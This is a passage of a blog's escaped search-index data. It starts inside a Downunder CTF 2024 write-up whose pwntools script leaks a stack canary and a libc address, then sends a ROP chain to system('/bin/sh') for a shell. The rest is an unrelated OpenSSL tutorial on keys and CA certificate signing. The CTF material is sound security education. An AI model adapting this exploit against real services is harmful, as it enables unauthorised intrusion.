style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecanary \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x00\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)[:\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;canary: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ehex(pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eu64(canary))\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026gt; \u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e89\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e canary[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:] \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026gt; \u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;2\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;aaa\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elibc_init_first \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efrom_bytes(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)[:\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e], \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x90\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;libc_init_first: \u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e hex(libc_init_first))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026gt; \u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elibc_init_first_offset \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e libc\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esymbols[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__libc_init_first\u0026#39;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elibc\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eaddress \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e libc_init_first \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e libc_init_first_offset\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystem_addr \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e libc\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esymbols[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;system\u0026#39;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebinsh_addr \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e next(libc\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esearch(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/bin/sh\u0026#39;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epop_rdi \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eROP(libc)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efind_gadget([\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;pop rdi\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ret\u0026#39;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e88\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e canary \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ep64(pop_rdi\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eaddress) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ep64(binsh_addr) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ep64(pop_rdi\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eaddress \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ep64(system_addr))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026gt; \u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;0\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einteractive()\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"flag\"\u003eflag\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/74ae9cb9-f2e9-4981-bed5-fd0671895d89\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eDUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}\u003c/code\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/downunder-ctf-2024-writeup/","title":"Downunder CTF 2024 Writeup"},{"content":"\u003ch2 id=\"openssl\"\u003eOpenSSL\u003c/h2\u003e\n\u003ch3 id=\"generate-a-private-key\"\u003eGenerate a private key\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl genrsa -out \u0026lt;private key file\u0026gt; \u0026lt;key length general we used 2048\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e執行結果\n\u003cimg src=\"https://i.imgur.com/RH3dXBZ.png\" alt=\"\"\u003e\nkey 的內容\n\u003cimg src=\"https://i.imgur.com/FU8bv1Z.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"generate-a-certificate-request\"\u003eGenerate a certificate request\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl req -new -key \u0026lt;private file\u0026gt; -out \u0026lt;request file\u0026gt; -addext \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;subjectAltName=\u0026lt;Alternative Name\u0026gt;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#addext is optional\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#addext 是可選項\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e執行結果\n\u003cimg src=\"https://i.imgur.com/JYYVsH6.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"self-sign-web-certificate\"\u003eSelf sign web certificate\u003c/h3\u003e\n\u003ch4 id=\"init-environment\"\u003eInit environment\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir demoCA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir demoCA/newcerts\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir demoCA/private\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026gt; demoCA/index.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026gt; demoCA/serial\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#ae81ff\"\u003e01\u003c/span\u003e \u0026gt; demoCA/crlnumber\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026gt; demoCA/cacert.pem\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp \u0026lt;private key\u0026gt; demoCA/private/cakey.pem\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://i.imgur.com/Ct9Va1h.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"modify-etcsslopensslcnf\"\u003eModify /etc/ssl/openssl.cnf\u003c/h4\u003e\n\u003cp\u003eAdd copy_extensions = copy at /etc/ssl/openssl.cnf under [ CA_default ]\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evi /etc/ssl/openssl.cnf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://i.imgur.com/4VIRu4e.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"write-extensions-file\"\u003eWrite extensions file\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evi \u0026lt;extensions file\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://i.imgur.com/WXybn8U.png\" alt=\"\"\u003e\n\u003cimg src=\"https://i.imgur.com/uNGts39.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"sign-certificate\"\u003eSign certificate\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl ca -in \u0026lt;request file\u0026gt; -out \u0026lt;certificate\u0026gt; -days \u0026lt;Validity period \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eday\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\u0026gt; -batch -rand_serial -extfile \u0026lt;extensions file\u0026gt; -selfsign\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"sign-a-root-ca\"\u003eSign a Root CA\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl x509 -req -days \u0026lt;Validity period \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eday\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\u0026gt; -sha256 -extfile /etc/ssl/openssl.cnf -extensions v3_ca -signkey \u0026lt;your private key\u0026gt; -in \u0026lt;request file\u0026gt; -out \u0026lt;certificate file\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e執行結果\n\u003cimg src=\"https://i.imgur.com/B7LJ2Sa.png\" alt=\"\"\u003e\n\u003cimg src=\"https://i.imgur.com/A9Jrbka.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"sign-a-sub-ca-certificate\"\u003eSign a sub CA certificate\u003c/h3\u003e\n\u003ch4 id=\"init-environment-1\"\u003eInit environment\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir demoCA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir demoCA/newcerts\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir demoCA/private\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026gt; demoCA/index.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026gt; demoCA/serial\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#ae81ff\"\u003e01\u003c/span\u003e \u0026gt; demoCA/crlnumber\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp \u0026lt;CA certificate\u0026gt; demoCA/cacert.pem\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp \u0026lt;CA private key\u0026gt; demoCA/private/cakey.pem\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://i.imgur.com/67klQBu.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"write-extensions-file-1\"\u003eWrite extensions file\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evi \u0026lt;extensions file\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://i.imgur.com/SR1etbR.png\" alt=\"\"\u003e\n\u003cimg src=\"https://i.imgur.com/e2TVD5Q.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003ecrlDistributionPoints is optional\ncrlDistributionPoints 是可選項\u003c/p\u003e\n\u003ch4 id=\"sign-sub-ca-certificate\"\u003eSign Sub CA certificate\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl ca -in \u0026lt;request file\u0026gt; -out \u0026lt;sub CA certificate file\u0026gt; -days \u0026lt;Validity period \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eday\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\u0026gt; -batch -rand_serial -extfile \u0026lt;extensions file\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e執行結果\n\u003cimg src=\"https://i.imgur.com/KWwZuXb.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch3 id=\"sign-a-certificate\"\u003eSign a certificate\u003c/h3\u003e\n\u003ch4 id=\"init-environment-2\"\u003eInit environment\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir demoCA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir demoCA/newcerts\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir demoCA/private\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026gt; demoCA/index.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u0026gt; demoCA/serial\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#ae81ff\"\u003e01\u003c/span\u003e \u0026gt; demoCA/crlnumber\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp \u0026lt;CA certificate\u0026gt; demoCA/cacert.pem\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecp \u0026lt;CA private key\u0026gt; demoCA/private/cakey.pem\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://i.imgur.com/Ct9Va1h.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"modify-etcsslopensslcnf-1\"\u003eModify /etc/ssl/openssl.cnf\u003c/h4\u003e\n\u003cp\u003eAdd copy_extensions = copy at /etc/ssl/openssl.cnf under [ CA_default ]\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evi /etc/ssl/openssl.cnf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://i.imgur.com/4VIRu4e.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"write-extensions-file-2\"\u003eWrite extensions file\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evi \u0026lt;extensions file\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://i.imgur.com/WXybn8U.png\" alt=\"\"\u003e\n\u003cimg src=\"https://i.imgur.com/uNGts39.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003ch4 id=\"sign-certificate-1\"\u003eSign certificate\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eopenssl ca -in \u0026lt;request file\u0026gt; -out \u0026lt;certificate\u0026gt; -days \u0026lt;Validity period \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eday\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\u0026gt; -batch -rand_serial -extfile \u0026lt;extensions file\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e執行結果\n\u003cimg src=\"https://i.imgur.com/R7TMRlB.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://i.imgur.com/Cj02FuE.png\" alt=\"\"\u003e\n\u003cimg 